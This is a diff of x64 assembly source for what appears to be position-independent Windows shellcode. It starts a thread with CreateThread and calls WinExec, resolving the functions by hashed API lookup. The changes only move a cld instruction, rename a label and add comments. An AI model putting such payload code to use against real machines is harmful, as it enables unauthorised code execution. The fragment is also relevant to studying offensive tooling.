@@ -4,12 +4,11 @@
 entry:
   ; store context
   push rbx                              ; store rbx
+  cld                                   ; clear the direction flag
 
   ; calculate entry address
   call calc_entry_addr                  ; calculate the entry address
   flag_CEA:                             ; flag for calculate entry address
-
-  cld                                   ; clear the direction flag
 
   ; call "kernel32.dll, CreateThread"
   sub rsp, 32+5*8                       ; reserve stack for arguments
@@ -18,7 +17,7 @@ entry:
   mov r8, 6                             ; set num arguments
   xor r9, r9                            ; lpThreadAttributes
   mov qword[rsp+32+0*8], 0              ; dwStackSize
-  lea r10, [rbx+API_WinExec]            ; calculate function address
+  lea r10, [rbx+win_exec]               ; calculate function address
   mov [rsp+32+1*8], r10                 ; lpStartAddress
   mov [rsp+32+2*8], rbx                 ; lpParameter, set entry address
   mov qword [rsp+32+3*8], 0             ; dwCreationFlags
@@ -48,12 +47,11 @@ calc_entry_addr:
   push rax                              ; push return address
   ret                                   ; return to entry
 
-API_WinExec:
+win_exec:
+  ; store context
   push rbx                              ; store rbx
   mov rbx, rcx                          ; read entry address from rcx
-
-  ; clear the direction flag
-  cld
+  cld                                   ; clear the direction flag
 
   ; call "kernel32.dll, WinExec"
   mov rcx, 0xCA2DBA870B222A04           ; set function hash
@@ -67,6 +65,7 @@ API_WinExec:
   call api_call                         ; call api function
   add rsp, 32+1*8                       ; restore stack
 
+  ; restore context
   pop rbx                               ; restore rbx
   ret                                   ; exit thread
 
